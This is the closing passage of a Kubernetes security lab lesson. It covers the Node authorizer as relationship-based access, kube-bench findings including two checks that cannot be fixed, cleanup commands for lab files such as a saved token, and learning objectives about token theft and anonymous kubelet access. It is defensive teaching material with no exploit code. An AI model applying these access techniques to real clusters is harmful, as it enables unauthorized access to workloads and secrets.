   THE NODE AUTHORIZER IS ReBAC, AND YOU'VE BEEN RUNNING IT
     list secrets -A  -> no - can only read namespaced object...
     get secret/x     -> no - NO RELATIONSHIP FOUND between node
                         'netlab-worker' AND THIS OBJECT
       <- graph REACHABILITY, not a rule lookup. exactly the
          model Act IX's in-the-wild page named, deciding what
          every kubelet may read since Act V.
     create pods      -> YES. a node can make a Pod, a Pod can
                         name any Secret in its ns. hence
                         NodeRestriction, on the ADMISSION side.
     one escalation, two mechanisms, two different stages.

   THE TOOL: kube-bench  43 PASS / 11 FAIL / 11 WARN
     its manifest needs hostPID + 3 hostPaths + a control-plane
     toleration. L03's `baseline` would REFUSE it. a scanner
     needs back most of what this act took away.
     the FAILs are a TABLE OF CONTENTS:
       --profiling x3 ......... the default you just read
       --audit-log-* x4 ....... lesson 10
       encryption-provider .... lesson 06 (WARN; you removed it)
       AlwaysPullImages ....... lesson 08 (WARN)
     AND TWO OF THE ELEVEN ARE UNFIXABLE:
       1.2.19 --insecure-port  -> grep -c in --help = 0
                                  (removed in 1.20)
       1.2.16 PodSecurityPolicy -> api-resources grep -c = 0
                                  (removed in 1.25; L03 replaced it)
     a red [FAIL] with a rule number and a remediation, WRONG.
     chase them and you lose days; discount the report and you
     lose the nine real ones. A SCANNER TELLS YOU WHAT IT
     CHECKED, NOT WHAT IS TRUE, and its authority is bounded by
     its own version.
```

**Cleanup:**

```bash
kubectl delete ns doors victim --ignore-not-found
docker exec netlab-worker rm -f /root/kubelet.bak
rm -f /tmp/tok.jwt /tmp/ca.crt /tmp/kubelet.yaml
```

> **You understand this when you can** name the three files in a Pod's ServiceAccount volume and say what each contributes to a working API client; decode a projected token and point at the claims that name the ServiceAccount, the Pod and the node; state the token's actual default lifetime, name the flag responsible, and quote what that flag does to `service-account-max-token-expiration`; say what the `default` ServiceAccount may do and why that is nonetheless not reassuring; explain the difference between a route and a permission, and demonstrate that switching off the token closes only one of them; predict and explain the `403`-to-`401` transition when a Pod is deleted, name the flag that makes it work, and say why this is the one place Act IX's freshness-versus-availability trade actually has a third option; state the general trick that made it possible in a sentence that does not mention Kubernetes; switch off the token at both Pod and ServiceAccount level and say which wins and what the empty `spec.volumes` proves about lesson 04; name the two kubelet settings that keep port 10250 shut and say what `mode: Webhook` delegates to; demonstrate what `AlwaysAllow` plus anonymous auth yields, and list which of lessons 01–06 stand in that path; explain why `--anonymous-auth=true` is correct on the API server and catastrophic on a kubelet, in terms of the authorizer behind it; read `no relationship found between node X and this object` and say which authorization model that is and which act named it; say why the Node authorizer is not sufficient on its own and which admission plugin covers the gap; run a CIS benchmark, connect at least four of its findings to specific lessons in this act, and explain why its own manifest would fail lesson 03's `baseline`; and demonstrate that two of its failures cannot be fixed, saying what that implies about how to read any scanner's output.

**Which raises:** every door in this lesson was opened by something that was **already running** — a kubelet, an API server, a Pod with a token. This act has spent seven lessons deciding what such things may do once they exist, and has never once asked where their bytes came from. Which is the one moment on the act's timeline you have not touched: the far left of that diagram, `BUILD`, the decision made earliest and knowing least, about an artifact that will still be running in two years. Lesson 04 already showed the hole from the other end — it built an image allowlist and then defeated it by typing `docker.io/library/busybox:1.36` instead of `busybox:1.36`, the same bytes under a different name, and concluded that the real fix was a digest and a signature and that this was lesson 08's business. kube-bench just named the same gap from a third direction with `AlwaysPullImages`. **So what exactly does an image tag point at, who can change it after you have approved it, and what would it take to state — and have the cluster check — that the thing running is the thing you built?**

---

↑ **[Act X overview](README.md)** · Prev: **[A Secret that is actually secret](06-a-secret-that-is-actually-secret.md)** · Next: **[What you shipped](08-what-you-shipped.md)** →
